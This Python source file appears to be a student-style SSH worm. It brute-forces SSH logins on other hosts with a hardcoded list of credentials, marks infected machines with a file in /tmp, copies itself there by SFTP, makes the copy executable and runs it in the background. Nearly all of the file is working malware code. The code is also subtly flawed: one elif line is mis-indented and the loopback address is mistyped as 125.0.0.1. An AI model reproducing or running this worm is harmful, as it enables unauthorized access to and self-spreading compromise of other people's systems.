import paramiko
import tarfile
import sys
import socket
import nmap
import os
import sys
import struct
import fcntl
import netifaces
import urllib
import shutil
from subprocess import call

# Make a list of credentials
login_list= [('this', 'one?'),
("hell0", "Adel3"),
('admin', 'admin'),
('root', '94849390')
]

#This file will say if the worm got in
UNLEASH_THE_FILE = '/tmp/infected.txt'

#Returns when the worm has the option to continue spreading
#True if it succeeded, False if DOA

#Will check to see if the system has been infected by looking for file
#infected.txt, which was created in directory /tmp

def isInfectedSystem(ssh):
  try:
    sftpClient = ssh.open_sftp()
    sftpClient.stat(UNLEASH_THE_FILE)
    return True
  except:
    return False

#Marks the system "infected"
def markInfected():
  file_object = open(UNLEASH_THE_FILE, 'w')
  file_object.write("I remember being like you once...")
  file_object.close()

#This will spread to the other systems and continue its infection
def spreadTheLove(sshClient):
  wormFind = '/tmp/givesmedough.py'

#This will take a parameter of the SSH class that was started and
#connected to the target system. The worm will then copy itself, 
#change its permission to executeable, and then execute itself.

  if len(sys.argv) >= 2:
    if sys.argv[1] =="--host":
      wormFind = 'givesmedough.py'
  sftpClient = sshClient.open_sftp()
  sftpClient.put(wormFind, '/tmp/givesmedough.py')
  sshClient.exec_command('chmod 777 /tmp/givesmedough.py')
  sshClient.exec_command('nohup python /tmp/givesmedough.py')

#This will try to connect to the host with the given credentials
# @param host - the host system domain or IP
# @param userName - the... user name
# @param password - 'nuff said
# @param sshClient - the SSH client
#return - 0 = success, 1 = credentials no bueno, or 3 = server is
# down or not running SSH
def tryCredentials(host, userName, _password, sshClient):
  try:
    sshClient.connect(host,username=userName, password= _password)
    return 0
  except paramiko.ssh_exception.AuthenticationException:
    return 1
  except socket.error:
    return 3

#This will commence a dictionary attack against the host
# @param host- the host to attack
# @return- the instance of the SSH paramiko class and the credentials
# (ssh, username, password). If the attack fails, return NULL
def attackSystem(host):
  #Credentials
  global login_list
  #Create SSH client instance
  ssh = paramiko.SSHClient()
  #Let's make a parameter
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  #Let's now go through the credentials
  for (username, password) in login_list:
    if tryCredentials(host,username, password, ssh) == 0:
      print ("Success with " + host +" " + username+ " " + password)
      return (ssh, username, password)
    elif tryCredentials(host, username, password, ssh) == 1:
      print ("Wrong credentials on host " + host)
      continue
   elif tryCredentials(host, username, password, ssh) == 3:
      print ("No SSH client on " + host)
      break #no point in continuing
#Couldn't find any working credentials
  return None

#Returns IP of the current system
#@param interface - the interface of the IP we're looking to get
#to know. 
#@return - the UP address of the current system
def getMyIP(interface):
  networkInterfaces = netifaces.interfaces()
  ipAdd = None
  for netFace in networkInterfaces:
    address = netifaces.ifaddresses(netFace)[2][0]['addr']
    if not address == "125.0.0.1":
      ipAdd = address
      break
  return ipAdd
